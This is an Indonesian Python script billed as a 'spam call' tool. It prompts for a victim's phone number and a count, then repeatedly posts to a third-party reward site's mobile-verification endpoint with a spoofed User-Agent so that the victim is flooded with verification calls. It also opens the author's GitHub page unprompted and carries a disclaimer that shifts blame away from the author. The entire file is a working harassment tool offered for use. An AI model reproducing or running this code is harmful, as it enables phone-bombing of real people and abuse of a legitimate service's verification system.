# WA AUTHOR : 088225349583
# JAIL BET DAH LUH:V
# Update 1.5
# INI SCRIPT RC DARI OPEN SOURCE CODE 
# JADI KALIAN HARUS SUBSCRIBE CHANNEL YT kZtotorial
import os,sys,time,requests
from time import sleep

#mengetik otomatis
def mengetik(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.05)
os.system("clear")
# Jangan di ubah
os.system('xdg-open https://github.com/CyberCarboon')
# Ubah Terserah kalian
banner= """
\033[1;30m<════════════[\033[1;33;41m • \033[1;37m SCRIPT SPAM CALL \033[1;33m• \033[0m\033[1;30m]══════════════>
\033[37m┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻┻━┻ 
\033[37m[\033[31m•\033[31m\033[37m]\033[37m\033[32m AUTHOR \033[37m:\033[31m CyberCarboon
\033[37m[\033[31m•\033[37m]\033[32m TEAM \033[37m: \033[33mBOPENG
\033[37m[\033[31m•\033[37m]\033[32m GITHUB\033[37m: \033[32mhttps://github.com/CyberCarboon
\033[37m[\033[31m•\033[37m]\033[32m FACEBOOK\033[37m: \033[34mSMART DANIE
\033[37m┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳┳━┳\033[37m"""
sleep(1)
print(banner)
# Jaggan di ubah sayang
print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m MASUKAN NOMOR TARGET \033[1;33m• \033[0m\033[1;30m]══════════════>")
print ("\033[37m[\033[31m•\033[37m]\033[32m Contoh nomor\033[37m : \033[37m\033[33m8Xxx\033[33m")
nomor = input("\033[37m[\033[31m•\033[37m]\033[32m Nomor Target\033[32m \033[37m:\033[37m\033[33m ")
print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m MASUKAN JUMLAH \033[1;33m• \033[0m\033[1;30m]══════════════>")
jumlah = int(input("\033[37m[\033[31m•\033[37m]\033[32m Jumlah Spam\033[37m :\033[37m\033[33m "))
mengetik("[SCRIPT INI SEWAKTU WAKTU BISA COID,JADI JANGAN SALAHKAN AUTHOR:V] ")
time.sleep(3)
# Jaggan di ubah sayang ku
url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}
# Jaggan di ubah sayng
for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" BERHASIL MELAKUKAN PANGGILAN")

